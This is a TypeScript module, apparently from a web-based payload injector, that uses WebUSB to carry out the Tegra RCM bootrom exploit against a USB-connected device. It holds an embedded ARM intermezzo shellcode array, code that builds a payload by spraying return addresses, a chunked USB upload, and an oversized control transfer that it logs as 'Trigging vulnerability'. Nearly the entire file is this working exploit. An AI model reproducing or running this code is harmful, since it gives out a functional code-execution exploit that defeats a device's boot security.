import './use-device.d'

const intermezzo = new Uint8Array([
  0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
  0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
  0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
  0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
  0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
  0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
])

const RCM_PAYLOAD_ADDRESS = 0x40010000
const INTERMEZZO_LOCATION = 0x4001F000
// eslint-disable-next-line @typescript-eslint/no-unused-vars
const PAYLOAD_LOAD_BLOCK = 0x40020000

function createRCMPayload(intermezzo: Uint8Array, payload: Uint8Array) {
  const rcmLength = 0x30298

  const intermezzoAddressRepeatCount = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4

  const rcmPayloadSize = Math.ceil((0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000 + payload.byteLength) / 0x1000) * 0x1000

  const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize))
  const rcmPayloadView = new DataView(rcmPayload.buffer)

  rcmPayloadView.setUint32(0x0, rcmLength, true)

  for (let i = 0; i < intermezzoAddressRepeatCount; i++) {
    rcmPayloadView.setUint32(0x2A8 + i * 4, INTERMEZZO_LOCATION, true)
  }

  rcmPayload.set(intermezzo, 0x2A8 + (0x4 * intermezzoAddressRepeatCount))
  rcmPayload.set(payload, 0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000)

  return rcmPayload
}

async function write(device: USBDevice, data: Uint8Array) {
  let length = data.length
  let writeCount = 0
  const packetSize = 0x1000

  while (length) {
    const dataToTransmit = Math.min(length, packetSize)
    length -= dataToTransmit

    const chunk = data.slice(0, dataToTransmit)
    data = data.slice(dataToTransmit)
    await device.transferOut(1, chunk)
    writeCount++
  }

  return writeCount
}

export async function injectBootLoader(device: USBDevice, payload: Uint8Array, printLog: (log: string, ...args: any[]) => void) {
  printLog(`Open USB device to ${device.manufacturerName || 'undefined'} ${device.productName || 'undefined'}`)
  await device.open()
    .catch((error: Error) => {
      printLog(`Failed to open USB device`, error)
    })

  if (device.configuration === null) {
    await device.selectConfiguration(1)
      .catch((error: Error) => {
        printLog(`Failed to selectConfiguration USB device`, error)
      })
  }

  await device.claimInterface(0)
    .catch((error: Error) => {
      printLog(`Failed to claimInterface USB device`, error)
    })

  // 1 号缓冲区的 0-16 个字节是设备 id 号
  const transferInPromise = device.transferIn(1, 16)

  transferInPromise.catch((error: Error) => {
    printLog(`Failed to transferIn USB device`, error)
  })

  function bufferToHex(data: DataView) {
    let result = ""
    for (let i = 0; i < data.byteLength; i++)
      result += data.getUint8(i).toString(16).padStart(2, "0")
    return result
  }

  const deviceID = await transferInPromise
  printLog(`Device ID: ${bufferToHex(deviceID.data)}`)

  const rcmPayload = createRCMPayload(intermezzo, payload)
  printLog("Sending payload...", rcmPayload)
  const writeCountPromise = write(device, rcmPayload)
  writeCountPromise.catch((error: Error) => {
    printLog(`Failed to controlTransferIn USB device`, error)
  })

  const writeCount = await writeCountPromise
  printLog("Payload sent!", writeCount)

  if (writeCount % 2 !== 1) {
    printLog("Switching to higher buffer...")
    await device.transferOut(1, new ArrayBuffer(0x1000)).catch((error: Error) => {
      printLog(`Failed to transferOut USB device`, error)
    })
  }

  printLog("Trigging vulnerability...")
  const vulnerabilityLength = 0x7000
  const controlTransferInPromise = device.controlTransferIn({
    requestType: 'standard',
    recipient: 'interface',
    request: 0x00,
    value: 0x00,
    index: 0x00
  }, vulnerabilityLength)

  controlTransferInPromise.catch((error: Error) => {
    printLog(`Failed to controlTransferIn USB device`, error)
  })

  const result = await controlTransferInPromise
  printLog("Trigging completed", result)
}
